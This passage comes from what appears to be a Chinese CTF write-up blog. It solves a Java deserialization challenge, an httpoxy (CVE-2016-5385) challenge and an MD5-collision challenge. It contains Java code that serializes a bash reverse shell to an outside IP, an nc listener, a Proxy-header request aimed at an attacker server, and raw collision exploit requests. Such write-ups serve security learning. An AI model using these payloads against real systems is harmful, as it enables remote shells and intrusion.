class="comment">//rO0ABXNyABRjb20udG9vbHMuQ2xpZW50SW5mbwAAAAAAAAABAgADTAAFZ3JvdXB0ABJMamF2YS9sYW5nL1N0cmluZztMAAJpZHEAfgABTAAEbmFtZXEAfgABeHB0AAp3ZWJtYW5hZ2VydAABMXQABWFkbWlu</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问题目链接替换cookies</p>
<p>由have try,Anonymous变成了have try,admin</p>
<p><img src="/%5Bpic/139.png" alt=""></p>
<p>查看任意文件读取漏洞</p>
<p><img src="/%5Bpic/140.png" alt=""></p>
<p>成功读取到/etc下的passwd（）</p>
<p>读取flag失败，权限不足</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Type 异常报告</span><br><span class="line"></span><br><span class="line">消息 file&#x3D;&#x2F;..&#x2F;..&#x2F;flag (No such file or directory)</span><br><span class="line"></span><br><span class="line">描述 服务器遇到一个意外的情况，阻止它完成请求。</span><br></pre></td></tr></table></figure>

<p>尝试上传木马，权限不足</p>
<p><img src="/%5Bpic/141.png" alt=""></p>
<p>目录穿越后还是权限不足</p>
<p><img src="/%5Bpic/142.png" alt=""></p>
<p>尝试反序列化后命令执行</p>
<p>改写tools类，将private String testCall;改成下面的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] testCall;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String[] getTestCall()&#123;</span><br><span class="line">       <span class="keyword">return</span> testCall;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTestCall</span><span class="params">(String[] testCall)</span></span>&#123;</span><br><span class="line">       <span class="keyword">this</span>.testCall = testCall;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p>Test类中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.tools.Tools;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)throws Exception&#123;</span><br><span class="line">        Base64.Encoder encoder &#x3D; Base64.getEncoder();</span><br><span class="line">        Tools tools &#x3D; new Tools();</span><br><span class="line">        String cmds[]&#x3D;&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.164.174&#x2F;1234 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">        tools.setTestCall(cmds);</span><br><span class="line">        byte[] bytes&#x3D;Tools.create(tools);</span><br><span class="line">        System.out.println(encoder.encodeToString(bytes)); &#x2F;&#x2F;rO0ABXNyAA9jb20udG9vbHMuVG9vbHMAAAAAAAAAAQIAAVsACHRlc3RDYWxsdAATW0xqYXZhL2xhbmcvU3RyaW5nO3hwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABGJhc2h0AAItY3QAKmJhc2ggLWk+JiAvZGV2L3RjcC8xNzQuMS4xNjQuMTc0LzEyMzQgMD4mMQ&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后用一台服务器监听即可收到shell</p>
<p><img src="/%5Bpic/143.png" alt=""></p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>打开就是源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;   <span class="comment">//true返回值是数组,否则返回值为object</span></span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看phpinfo</p>
<p>是5.6.23版本的</p>
<p>发现没有禁用函数</p>
<table>
<thead>
<tr>
<th>allow_url_fopen</th>
<th>On</th>
</tr>
</thead>
<tbody><tr>
<td>allow_url_include</td>
<td>Off</td>
</tr>
</tbody></table>
<p>存在任意文件读取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//autoload.php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">'/composer/autoload_real.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//autoload_real.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//./vendor/composer/ClassLoader.php</span></span><br></pre></td></tr></table></figure>

<p><del>看到guzzlehttp/guzzle有任意写文件漏洞<a href="https://www.anquanke.com/post/id/86452" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86452</a></del></p>
<p>查看composer.json</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//composer.json</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">"require"</span>: &#123;</span><br><span class="line">      <span class="string">"guzzlehttp/guzzle"</span>: <span class="string">"6.2.0"</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>出题人<a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">赵师傅博客</a>也说了是改自<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p>
<p>考点是cgi 的httpproxy漏洞（CVE-2016-5385） vulhub上有漏洞说明</p>
<blockquote>
<p>CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信，这里就是nginx和php进行通信，因为nginx和php的语言不通，因此需要一个沟通转换的过程，而CGI就是这个沟通的协议。</p>
<p>nginx服务器在接受到浏览器传递过来的数据后，如果请求的是静态的页面或者图片等无需动态处理的则会直接根据请求的url找到其位置然后返回给浏览器，这里无需php参与，但是如果是一个动态的页面请求，这个时候nginx就必须与php通信，这个时候就会需要用到cgi协议，将请求数据转换成php能理解的信息，然后php根据这些信息返回的信息也要通过cgi协议转换成nginx可以理解的信息，最后nginx接到这些信息再返回给浏览器。</p>
</blockquote>
<p>访问请求时，添加一个proxy头部，浏览就会转发到 代理服务器，此时的访问就变成了代理服务器的127.0.0.1:500</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br></pre></td></tr></table></figure>

<p>在代理服务器中弄一个web服务器，api/eligible的内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;success&quot;:True&#125;</span><br></pre></td></tr></table></figure>

<p>即可得到。</p>
<p><strong>注意</strong></p>
<p>由于在buuoj上无法访问外网，但是可以获取一台内网linux的控制权，搭建一台代理服务器，也有更简单的方式，</p>
<p>创建一个文件内容为例如 a.txt</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"></span><br><span class="line">&#123;"success":true&#125;</span><br></pre></td></tr></table></figure>

<p>在linux上使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234 &lt; a.txt</span><br></pre></td></tr></table></figure>

<p>然后发访问<a href="http://xxx/?flag，抓包添加一个proxy头部" target="_blank" rel="noopener">http://xxx/?flag，抓包添加一个proxy头部</a> 地址为你获取控制权的linux ip地址</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:25315</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0, no-cache</span><br><span class="line"><span class="attribute">Proxy</span>: http://174.0.246.216:1234/</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br></pre></td></tr></table></figure>

<p>即可获取flag</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"> ········</span><br><span class="line"> </span><br><span class="line">#DD0000"&gt;'phpinfo'<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: #007700"</span>&gt;</span>]))<span class="symbol">&amp;nbsp;</span>&#123;<span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: #0000BB"</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: #007700"</span>&gt;</span>();<span class="tag">&lt;<span class="name">br</span> /&gt;</span>&#125;<span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span>flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br><span class="line">flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br></pre></td></tr></table></figure>







<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/ludashi/p/6513478.html" target="_blank" rel="noopener">https://www.cnblogs.com/ludashi/p/6513478.html</a><br><a href="https://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">https://www.runoob.com/java/java-serialization.html</a><br><a href="https://www.jianshu.com/p/10f4771909f9" target="_blank" rel="noopener">https://www.jianshu.com/p/10f4771909f9</a><br><a href="https://mp.weixin.qq.com/s/KFgBbi2LgKhOKMDjfybl2A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/KFgBbi2LgKhOKMDjfybl2A</a><br><a href="https://www.colabug.com/2020/0204/6940556/amp/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/amp/</a><br><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a><br><a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html</a><br><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒月赛20200226</title>
    <url>/2020/02/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200226/</url>
    <content><![CDATA[<h1 id="easy-hash"><a href="#easy-hash" class="headerlink" title="easy-hash"></a>easy-hash</h1><p>打开题目就是源码</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$val1 = @$_GET[<span class="string">'val1'</span>];</span><br><span class="line">$val2 = @$_GET[<span class="string">'val2'</span>];</span><br><span class="line">$val3 = @$_GET[<span class="string">'val3'</span>];</span><br><span class="line">$val4 = @$_GET[<span class="string">'val4'</span>];</span><br><span class="line">$val5 = (string)@$_POST[<span class="string">'val5'</span>];</span><br><span class="line">$val6 = (string)@$_POST[<span class="string">'val6'</span>];</span><br><span class="line">$val7 = (string)@$_POST[<span class="string">'val7'</span>];</span><br><span class="line"><span class="keyword">if</span>( $val1 == $val2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val1 OR val2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($val1) != md5($val2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val3 == $val4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val3 OR val4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($val3) !== md5($val4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val5 OR val6 OR val7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_alnum($a)) || (strlen($a) &gt; <span class="number">5</span>)  || !(ctype_alnum($b)) || (strlen($b) &gt; <span class="number">6</span>))    <span class="comment">////判断是否是字母和数字或字母数字的组合</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">1</span>) || (strlen($n) &gt; <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 = md5($a);</span><br><span class="line">$val9 = strtr(md5($b), $m, $n);  <span class="comment">//将MD5后包含$m的内容替换为$n</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val8 : $val8&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val9 : $val9&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/flag.php'</span>);</span><br><span class="line">&#125; val1 <span class="keyword">OR</span> val2 no no no</span><br></pre></td></tr></table></figure>

<p>显然的MD5碰撞</p>
<p>生成的四组不同字符相同MD5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class="line"></span><br><span class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br><span class="line"></span><br><span class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class="line"></span><br><span class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br></pre></td></tr></table></figure>

<p>发包</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?val1=s878926199a&amp;val2=s155964671a&amp;val3=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;m=a&amp;n=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 183.129.189.60:10004</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 2337</span><br><span class="line"><span class="attribute">Origin</span>: http://183.129.189.60:10004</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://183.129.189.60:10004/?val1=s878926199a&amp;val2=s155964671a&amp;val3=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4=%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;val5=%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%12%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%7B%F9%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%CA%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%9D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%2C%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%C3%0F%93%72%5C&amp;val6=%39%98%EB%F3%ED%EC%0F%45%C0%89%DD%13%77%E0%88%34%41%BF%20%0B%2B%1B%D8%D0%40%5A%7A%6E%52%92%AF%C8%5B%FD%E4%F5%E2%2A%EA%FC%CB%25%63%59%98%7B%78%54%24%A1%35%20%A5%2A%D6%22%35%04%B2%74%01%03%9E%F7%08%01%88%BA%03%88%01%09%65%96%5D%D2%A6%A2%3B%FF%AF%97%3D%88%50%1C%13%DA%49%B3%20%00%3A%60%88%E7%D7%B3%28%58%AF%04%6C%FC%F5%FE%0D%93%42%70%00%BD%EA%CE%D1%14%B4%B1%8E%47%8D%AD%2E%E5%2D%64%1D%3A&amp;val7=%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7